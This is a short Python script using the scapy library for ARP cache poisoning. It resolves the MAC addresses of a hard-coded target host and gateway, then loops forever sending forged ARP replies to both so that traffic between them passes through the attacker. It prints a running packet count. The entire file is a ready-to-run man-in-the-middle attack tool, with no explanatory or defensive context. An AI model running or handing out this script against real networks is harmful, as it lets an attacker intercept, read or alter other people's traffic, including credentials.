import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_req=scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    pkt=broadcast/arp_req
    answered = scapy.srp(pkt, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc


def spoof(target_ip, spoof_ip, target_mac):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

sent_packets_count=0
target_ip="192.168.0.28"
spoof_ip="192.168.0.1"
target_mac=get_mac(str(target_ip))
spoof_mac=get_mac(str(spoof_ip))
while True:
    spoof(str(target_ip), str(spoof_ip), target_mac)
    spoof(str(spoof_ip), str(target_ip), spoof_mac)
    sent_packets_count+=2
    print(f"\r[+] Packets sent: {sent_packets_count}", end='')
    sys.stdout.flush()
    time.sleep(2)

    
